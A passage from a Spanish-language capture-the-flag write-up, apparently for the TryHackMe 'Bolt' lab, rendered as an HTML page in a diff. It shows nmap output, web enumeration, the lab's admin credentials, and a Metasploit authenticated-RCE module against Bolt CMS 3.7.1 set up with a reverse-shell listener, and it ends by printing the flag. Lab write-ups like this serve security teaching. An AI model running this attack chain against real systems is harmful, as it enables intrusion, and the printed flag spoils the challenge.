+SF:20<span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;head&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;meta<span class="se">\x</span>20charset<span class="o">=</span>
+SF:<span class="se">\&quot;</span>utf-8<span class="se">\&quot;</span>&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;meta<span class="se">\x</span>20name<span class="o">=</span><span class="se">\&quot;</span>viewport<span class="se">\&quot;\</span>
+SF:x20content<span class="o">=</span><span class="se">\&quot;</span><span class="nv">width</span><span class="o">=</span>device-width,<span class="se">\x</span>20initial-scale<span class="o">=</span><span class="m">1</span><span class="se">\.</span><span class="m">0</span><span class="se">\&quot;</span>&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>
+SF:<span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;title&gt;Bolt<span class="se">\x</span><span class="m">20</span><span class="se">\|\x</span>
+SF:20A<span class="se">\x</span>20hero<span class="se">\x</span>20is<span class="se">\x</span>20unleashed&lt;/title&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">2</span>
+SF:0&lt;link<span class="se">\x</span>20href<span class="o">=</span><span class="se">\&quot;</span>https://fonts<span class="se">\.</span>googleapis<span class="se">\.</span>com/css<span class="se">\?</span><span class="nv">family</span><span class="o">=</span>Bitter<span class="se">\|</span>Rob
+SF:oto:400,400i,700<span class="se">\&quot;\x</span>20rel<span class="o">=</span><span class="se">\&quot;</span>stylesheet<span class="se">\&quot;</span>&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>
+SF:<span class="se">\x</span><span class="m">20</span>&lt;link<span class="se">\x</span>20rel<span class="o">=</span><span class="se">\&quot;</span>stylesheet<span class="se">\&quot;\x</span>20href<span class="o">=</span><span class="se">\&quot;</span>/theme/base-2018/css/bulma<span class="se">\.</span>c
+SF:ss<span class="se">\?</span>8ca0842ebb<span class="se">\&quot;</span>&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;link<span class="se">\x</span>20rel<span class="o">=</span><span class="se">\&quot;</span>style
+SF:sheet<span class="se">\&quot;\x</span>20href<span class="o">=</span><span class="se">\&quot;</span>/theme/base-2018/css/theme<span class="se">\.</span>css<span class="se">\?</span>6cb66bfe9f<span class="se">\&quot;</span>&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\</span>
+SF:x20<span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\t</span>&lt;meta<span class="se">\x</span>20name<span class="o">=</span><span class="se">\&quot;</span>generator<span class="se">\&quot;\x</span>20content<span class="o">=</span><span class="se">\&quot;</span>Bolt<span class="se">\&quot;</span>&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>
+SF:<span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\t</span>&lt;link<span class="se">\x</span>20rel<span class="o">=</span><span class="se">\&quot;</span>canonical<span class="se">\&quot;\x</span>20href<span class="o">=</span><span class="se">\&quot;</span>http://0<span class="se">\.</span><span class="m">0</span><span class="se">\.</span><span class="m">0</span><span class="se">\.</span><span class="m">0</span>:8000/<span class="se">\</span>
+SF:<span class="s2">&quot;&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body\x20class=\&quot;front\&quot;&gt;\</span>
+<span class="s2">SF:n\x20\x20\x20\x20\x20\x20\x20\x20&lt;a\x20&quot;</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourRequest,102B,<span class="s2">&quot;HTT</span>
+<span class="s2">SF:P/1\.0\x20404\x20Not\x20Found\r\nDate:\x20Fri,\x2027\x20Sep\x202024\x20</span>
+<span class="s2">SF:08:27:38\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.3</span>
+<span class="s2">SF:2-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20private,\x</span>
+<span class="s2">SF:20must-revalidate\r\nDate:\x20Fri,\x2027\x20Sep\x202024\x2008:27:38\x20</span>
+<span class="s2">SF:GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\npragma:\x20no-ca</span>
+<span class="s2">SF:che\r\nexpires:\x20-1\r\nX-Debug-Token:\x20c3f952\r\n\r\n&lt;!doctype\x20h</span>
+<span class="s2">SF:tml&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x</span>
+<span class="s2">SF:20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20</span>
+<span class="s2">SF:\x20&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20init</span>
+<span class="s2">SF:ial-scale=1\.0\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span>
+<span class="s2">SF:\x20\x20\x20&lt;title&gt;Bolt\x20\|\x20A\x20hero\x20is\x20unleashed&lt;/title&gt;\n</span>
+<span class="s2">SF:\x20\x20\x20\x20\x20\x20\x20\x20&lt;link\x20href=\&quot;https://fonts\.googleap</span>
+<span class="s2">SF:is\.com/css\?family=Bitter\|Roboto:400,400i,700\&quot;\x20rel=\&quot;stylesheet\&quot;</span>
+<span class="s2">SF:&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=</span>
+<span class="s2">SF:\&quot;/theme/base-2018/css/bulma\.css\?8ca0842ebb\&quot;&gt;\n\x20\x20\x20\x20\x20\</span>
+<span class="s2">SF:x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/theme/base-2018/css/t</span>
+<span class="s2">SF:heme\.css\?6cb66bfe9f\&quot;&gt;\n\x20\x20\x20\x20\t&lt;meta\x20name=\&quot;generator\&quot;</span>
+<span class="s2">SF:\x20content=\&quot;Bolt\&quot;&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\</span>
+<span class="s2">SF:n\x20\x20\x20\x20\x20\x20\x20\x20&lt;a\x20href=\&quot;#main-content\&quot;\x20class=</span>
+<span class="s2">SF:\&quot;vis&quot;</span><span class="o">)</span><span class="p">;</span>
+Warning:<span class="w"> </span>OSScan<span class="w"> </span>results<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>unreliable<span class="w"> </span>because<span class="w"> </span>we<span class="w"> </span>could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>at<span class="w"> </span>least<span class="w"> </span><span class="m">1</span><span class="w"> </span>open<span class="w"> </span>and<span class="w"> </span><span class="m">1</span><span class="w"> </span>closed<span class="w"> </span>port
+Aggressive<span class="w"> </span>OS<span class="w"> </span>guesses:<span class="w"> </span>Linux<span class="w"> </span><span class="m">3</span>.1<span class="w"> </span><span class="o">(</span><span class="m">95</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">3</span>.2<span class="w"> </span><span class="o">(</span><span class="m">95</span>%<span class="o">)</span>,<span class="w"> </span>AXIS<span class="w"> </span>210A<span class="w"> </span>or<span class="w"> </span><span class="m">211</span><span class="w"> </span>Network<span class="w"> </span>Camera<span class="w"> </span><span class="o">(</span>Linux<span class="w"> </span><span class="m">2</span>.6.17<span class="o">)</span><span class="w"> </span><span class="o">(</span><span class="m">95</span>%<span class="o">)</span>,<span class="w"> </span>ASUS<span class="w"> </span>RT-N56U<span class="w"> </span>WAP<span class="w"> </span><span class="o">(</span>Linux<span class="w"> </span><span class="m">3</span>.4<span class="o">)</span><span class="w"> </span><span class="o">(</span><span class="m">93</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">3</span>.16<span class="w"> </span><span class="o">(</span><span class="m">93</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">2</span>.6.32<span class="w"> </span><span class="o">(</span><span class="m">93</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">2</span>.6.39<span class="w"> </span>-<span class="w"> </span><span class="m">3</span>.2<span class="w"> </span><span class="o">(</span><span class="m">93</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">3</span>.1<span class="w"> </span>-<span class="w"> </span><span class="m">3</span>.2<span class="w"> </span><span class="o">(</span><span class="m">93</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">3</span>.2<span class="w"> </span>-<span class="w"> </span><span class="m">4</span>.9<span class="w"> </span><span class="o">(</span><span class="m">93</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">3</span>.7<span class="w"> </span>-<span class="w"> </span><span class="m">3</span>.10<span class="w"> </span><span class="o">(</span><span class="m">93</span>%<span class="o">)</span>
+No<span class="w"> </span>exact<span class="w"> </span>OS<span class="w"> </span>matches<span class="w"> </span><span class="k">for</span><span class="w"> </span>host<span class="w"> </span><span class="o">(</span><span class="nb">test</span><span class="w"> </span>conditions<span class="w"> </span>non-ideal<span class="o">)</span>.
+Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">2</span><span class="w"> </span>hops
+Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+</code></pre></div>
+<h3 id="http">HTTP<a class="headerlink" href="#http" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>whatweb<span class="w"> </span>http://10.10.103.171
+
+whatweb<span class="w"> </span>http://10.10.103.171:8000
+</code></pre></div>
+<p><img alt="alt text" src="img/image-2.png" /></p>
+<p><img alt="alt text" src="img/image-1.png" /></p>
+<table>
+<thead>
+<tr>
+<th>user</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bolt</td>
+<td>boltadmin123</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="alt text" src="img/image-3.png" /></p>
+<p><img alt="alt text" src="img/image-4.png" /></p>
+<p>Buscamos con dirbuster y gobuster pero nada interesante.</p>
+<div class="highlight"><pre><span></span><code>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://10.10.103.171:8000/<span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">20</span><span class="w"> </span>php,js,html,txt
+
+nmap<span class="w"> </span>--script<span class="o">=</span>http-enum<span class="w"> </span>-p8000<span class="w"> </span><span class="m">10</span>.10.103.171<span class="w"> </span>-oN<span class="w"> </span>webScan<span class="w"> </span>
+</code></pre></div>
+<p><img alt="alt text" src="img/image-5.png" /></p>
+<p><img alt="alt text" src="img/image-6.png" /></p>
+<p>Buscamos en google algo relacionado con alguna ruta login ya que tenemos credenciales </p>
+<p><img alt="alt text" src="img/image-7.png" /></p>
+<p>url: 
+<div class="highlight"><pre><span></span><code>http://10.10.103.171:8000/bolt/login
+</code></pre></div></p>
+<p><img alt="alt text" src="img/image-8.png" /></p>
+<p><img alt="alt text" src="img/image-9.png" /></p>
+<p>Ingresamos con las credencial y encontramos la version de bolt: 3.7.1</p>
+<p><img alt="alt text" src="img/image-16.png" /></p>
+<p><img alt="alt text" src="img/image-10.png" /></p>
+<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
+<p>Buscamos posibles exploit</p>
+<div class="highlight"><pre><span></span><code>searchsploit<span class="w"> </span>bolt
+</code></pre></div>
+<p><img alt="alt text" src="img/image-11.png" /></p>
+<p><img alt="alt text" src="img/image-12.png" /></p>
+<div class="highlight"><pre><span></span><code>use<span class="w"> </span>exploit/unix/webapp/bolt_authenticated_rce
+<span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">10</span>.10.103.171
+<span class="nb">set</span><span class="w"> </span>USERNAME<span class="w"> </span>bolt
+<span class="nb">set</span><span class="w"> </span>PASSWORD<span class="w"> </span>boltadmin123
+<span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span>tun0
+
+run
+</code></pre></div>
+<p><img alt="alt text" src="img/image-13.png" /></p>
+<p><img alt="alt text" src="img/image-14.png" /></p>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>/home/flag.txt
+THM<span class="o">{</span>wh0_d035nt_l0ve5_b0l7_r1gh7?<span class="o">}</span>
+</code></pre></div>
+<p><img alt="alt text" src="img/image-15.png" /></p>
+<p><img alt="alt text" src="img/image-17.png" /></p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.path", "content.code.copy", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
